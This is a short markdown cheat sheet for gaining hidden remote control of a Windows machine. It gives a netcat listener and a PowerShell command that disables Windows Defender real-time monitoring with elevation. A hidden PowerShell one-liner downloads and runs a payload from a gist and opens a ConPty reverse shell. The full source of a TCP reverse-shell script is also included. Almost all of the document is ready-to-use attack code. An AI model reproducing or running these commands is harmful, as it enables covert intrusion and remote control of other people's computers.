# Using NetCat

## Hidden PowerShell for Windows
### Server side
```bash
nc -lp 80
```
### Client side

- To disable windows defender, `win+r` then paste

```ps1
powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
```

- Load the script and listen on the ip and port numbers specified, `win+r` then paste

```ps1
powershell -w hidden "IEX(IWR https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.29.21 80"
```

## Script
- Change the ip address in the "quotes" and the port (80)
- No need to paste this script in the client machine. Make this a gist, changing the ip and port number and paste the raw url of the gist in the snipped above 

```ps1
$client = New-Object System.Net.Sockets.TCPClient("192.168.29.21",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1

--------------------
--------------------
--------------------

## Non-Hidden
```ps1
IEX(IWR https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.29.21 80
```

## From this video
https://www.youtube.com/watch?v=A2JNBpUotZM

## Original Script
https://github.com/davidbombal/hak5

--------------------
--------------------
--------------------

## Commands
- Get running apps

```
get-process
```

- Stop process / Close an app

```
stop-process -processname explorer
```
